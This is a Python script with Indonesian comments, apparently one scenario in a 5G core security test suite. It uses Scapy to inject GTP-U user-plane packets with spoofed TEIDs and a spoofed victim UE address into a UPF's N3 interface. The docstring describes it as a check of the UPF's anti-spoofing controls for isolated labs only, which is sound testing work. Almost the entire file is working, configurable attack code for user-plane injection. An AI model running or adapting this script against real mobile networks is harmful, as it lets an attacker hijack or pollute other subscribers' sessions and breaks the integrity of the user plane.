#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Grup 1 — gtpu_teid_injection (N3, GTP-U → UPF).
Guideline: Core-25 (integritas user-plane). Model ancaman: penyerang meng-INJECT
paket GTP-U G-PDU yang SAH-secara-format ke UPF dgn TEID di-SPOOF (menebak/menargetkan
TEID downlink/uplink UE lain) sehingga paket IP "sisipan" seolah milik bearer UE
korban. Berbeda dari gtpu_malformed (paket cacat) — di sini GTP-U VALID tapi TEID
& inner-IP dipalsukan → uji kontrol TEID/anti-spoofing UPF.

  python3 gtpu_teid_inject.py <upf_n3_ip> [victim_ue_ip]
Env (mode EPISODE):
  SESSIONS=<n>          flow independen (source port efemeral acak), default 40
  PKTS_PER_SESSION=<k>  G-PDU per flow (default 6)
  TEID_LO/TEID_HI       rentang TEID yg ditebak (default 1..4096)
  SPORT_LO/SPORT_HI     rentang UDP source port efemeral (default 20000..60000)
Hanya LAB TERISOLASI. Guard subnet ditegakkan run_scenario.sh.
"""
import sys, os, time, random
os.environ.setdefault("SCAPY_USE_PCAPDNET", "0")
from scapy.all import IP, UDP, send
from scapy.contrib.gtp import GTP_U_Header

GTPU_PORT = 2152
GPDU = 255  # G-PDU message type (payload user-plane yang SAH)

def build_inject(target, sport, teid, victim_ip, dn_ip):
    # Inner IP: seolah UE korban (victim_ip) mengirim ke host DN (dn_ip) — disisipkan
    # ke bearer korban via TEID spoof. Inner = IP/UDP payload acak kecil.
    inner = IP(src=victim_ip, dst=dn_ip) / UDP(sport=random.randint(1024, 65000),
                                               dport=random.choice([53, 80, 123, 8080])) / bytes(os.urandom(random.choice([16, 32, 64])))
    return (IP(dst=target) / UDP(sport=sport, dport=GTPU_PORT) /
            GTP_U_Header(gtp_type=GPDU, teid=teid) / bytes(inner))

def run(target, victim_ip):
    sessions = int(os.environ.get("SESSIONS", "40"))
    pks = int(os.environ.get("PKTS_PER_SESSION", "6"))
    tlo = int(os.environ.get("TEID_LO", "1")); thi = int(os.environ.get("TEID_HI", "4096"))
    slo = int(os.environ.get("SPORT_LO", "20000")); shi = int(os.environ.get("SPORT_HI", "60000"))
    dn_ip = os.environ.get("DN_IP", "172.24.0.10")
    print(f"[gtpu_teid_injection] {sessions} flow × {pks} G-PDU (TEID {tlo}-{thi} spoof) "
          f"→ {target}:{GTPU_PORT}, inner korban {victim_ip}→{dn_ip}")
    ports = set(); sent = 0
    for _ in range(sessions):
        sport = random.randint(slo, shi)
        while sport in ports: sport = random.randint(slo, shi)
        ports.add(sport)
        teid = random.randint(tlo, thi)          # TEID di-spoof, bervariasi antar-flow
        for _ in range(pks):
            send(build_inject(target, sport, teid, victim_ip, dn_ip), verbose=0)
            sent += 1
        time.sleep(random.uniform(0.01, 0.04))   # jitter antar-flow
    print(f"[gtpu_teid_injection] selesai: {len(ports)} flow unik, {sent} G-PDU injeksi.")

def main():
    if len(sys.argv) < 2:
        print(__doc__); sys.exit(2)
    target = sys.argv[1]
    victim = sys.argv[2] if len(sys.argv) > 2 else "10.45.0.2"  # UE lain (korban) di subnet UE
    run(target, victim)

if __name__ == "__main__":
    main()
